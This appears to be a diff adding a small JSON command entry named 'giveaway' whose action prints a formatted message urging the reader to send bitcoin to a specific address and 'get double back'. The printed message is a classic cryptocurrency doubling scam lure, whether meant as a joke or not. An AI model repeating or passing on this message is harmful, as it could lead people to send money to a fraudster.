@@ -1,0 +1,6 @@
+{
+    "locked": true,
+    "starred": false,
+    "name": "giveaway",
+    "command": "print(`send {y}BTC{/} to {y}bc1qlwgq9lhqzqhj4l7ztzn922j0lpv9j9vdc382cy{/} and get double back{bo}!{/} {dg}(1₿ max)` )"
+}
